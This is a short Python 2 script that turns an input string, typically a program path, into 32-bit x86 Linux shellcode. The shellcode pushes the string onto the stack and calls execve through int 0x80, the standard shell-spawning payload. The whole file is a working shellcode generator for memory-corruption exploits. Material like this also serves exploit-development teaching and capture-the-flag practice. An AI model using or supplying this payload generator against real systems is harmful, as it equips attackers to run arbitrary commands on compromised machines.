#!/usr/bin/python

# Generate shellcode for given input string.

import sys

string = sys.argv[1]
str_asm = ""

if len(string) % 4 != 0:
	string = '/' * (4 - (len(string) % 4)) + string

push = "\\x68"
str_hex = string.encode("hex")
i = 0
hex_codes = []
for i in range(0, len(str_hex), 8):
	hex_codes.append(str_hex[i:i+8])

j = 0
for i in range(len(hex_codes) - 1, -1, -1):
	j = 0
	str_asm += push
	while j < len(hex_codes[i]):
		str_asm += "\\x" + hex_codes[i][j] + hex_codes[i][j + 1]
		j += 2

shellcode = "\\x31\\xc0\\x50" + str_asm + "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print shellcode
